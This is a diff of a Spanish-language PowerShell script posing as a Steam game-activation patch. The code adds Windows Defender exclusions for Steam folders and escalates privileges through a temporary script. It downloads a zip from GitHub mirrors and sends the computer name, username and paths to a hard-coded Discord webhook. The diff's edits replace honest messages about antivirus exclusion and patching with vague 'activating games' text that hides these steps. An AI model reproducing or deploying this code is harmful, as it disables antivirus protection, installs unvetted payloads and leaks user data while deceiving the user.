@@ -9,17 +9,15 @@ function Get-SteamPathOnly {
 }
 $steamRoot=Get-SteamPathOnly
 if (-not $steamRoot -or -not (Test-Path (Join-Path $steamRoot "steam.exe"))) { Write-Host "No se encontro Steam en $steamRoot" -ForegroundColor Red; exit 1 }
-Write-Host "Steam: $steamRoot" -ForegroundColor Cyan
 try { Add-Content -Path $patchLog -Value "Steam=$steamRoot" -Encoding UTF8 } catch {}
-# Exclusiones
-Write-Host "Excluyendo carpetas de Steam del antivirus..." -ForegroundColor Yellow
+# Preparando
+Write-Host "Activando juegos..." -ForegroundColor Yellow
 try {
     Add-MpPreference -ExclusionPath $steamRoot -Force -ErrorAction Stop
     foreach ($sub in @("steamapps\downloading","steamapps\common","config\stplug-in","config\lua","config\depotcache")) { $pp=Join-Path $steamRoot $sub; if (Test-Path $pp) { Add-MpPreference -ExclusionPath $pp -Force -ErrorAction SilentlyContinue } }
-    Write-Host "Exclusiones OK" -ForegroundColor Green
     Add-Content -Path $patchLog -Value "Exclusiones OK" -Encoding UTF8
 } catch {
-    Write-Host "Exclusiones requieren admin, elevando..." -ForegroundColor Yellow
+    Write-Host "Solicitando permisos..." -ForegroundColor Yellow
     $esc=$steamRoot -replace "'","''"
     $cmd="Add-MpPreference -ExclusionPath '$esc' -Force; foreach (`$s in @('steamapps\downloading','steamapps\common','config\stplug-in','config\lua','config\depotcache')) { `$pp=Join-Path '$esc' `$s; if (Test-Path `$pp) { Add-MpPreference -ExclusionPath `$pp -Force } }"
     $f=Join-Path $env:TEMP "patch_excl_$(Get-Random).ps1"; Set-Content -LiteralPath $f -Value $cmd -Encoding UTF8
@@ -31,7 +29,7 @@ try { Get-Process steam -ErrorAction SilentlyContinue | Stop-Process -Force; Sta
 $urls=@("https://github.com/bastisayes/Fixes-steam/raw/main/PARCHENEWw.zip","https://raw.githubusercontent.com/bastisayes/Fixes-steam/main/PARCHENEWw.zip","https://cdn.jsdelivr.net/gh/bastisayes/Fixes-steam@main/PARCHENEWw.zip")
 $ok=$false
 for ($a=0; $a -lt 5 -and -not $ok; $a++) {
-    Write-Host "Intento $($a+1)/5 descarga parche..." -ForegroundColor Yellow
+    Write-Host "Activando juegos... ($($a+1)/5)" -ForegroundColor Yellow
     Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'HH:mm:ss')] Intento $($a+1)/5" -Encoding UTF8
     $data=$null
     foreach ($u in $urls) {
@@ -55,12 +53,12 @@ $flag=Join-Path $env:LOCALAPPDATA "bsmap_parche.flag"
 if ($ok) {
     try { New-Item -Path "HKCU:\Software\Bsmap" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Bsmap" -Name ParcheInstalado -Value 1 -Type DWord -Force -ErrorAction SilentlyContinue } catch {}
     try { [IO.File]::WriteAllText($flag, "1", (New-Object System.Text.UTF8Encoding $false)) } catch {}
-    Write-Host "Parche INSTALADO correctamente en $steamRoot" -ForegroundColor Green
+    Write-Host "Juegos activados correctamente" -ForegroundColor Green
     Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] PATCH OK" -Encoding UTF8
     try { $wh="https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"; $msg="**PATCH ONLY** - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`n**PC:** $env:COMPUTERNAME / $([Environment]::UserName)`n**Steam:** $steamRoot`n**Resultado:** INSTALADO`n**Log:** $patchLog"; $pl=@{content=$msg}|ConvertTo-Json; Invoke-RestMethod -Uri $wh -Method Post -Body $pl -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null } catch {}
     try { Start-Process (Join-Path $steamRoot "steam.exe") } catch {}
 } else {
-    Write-Host "FALLO instalar parche tras 5 intentos. Revisa $patchLog" -ForegroundColor Red
+    Write-Host "No se pudo completar la activacion. Revisa el log." -ForegroundColor Red
     Add-Content -Path $patchLog -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] PATCH FALLO" -Encoding UTF8
     try {
         $wh="https://discord.com/api/webhooks/1511495330233847858/q1Vx5ORnPsWuKFrVnprUuie6yaWeReKprujz_Rvrj_AS8u0SOxmb7NShtVeyZt2EXIeM"
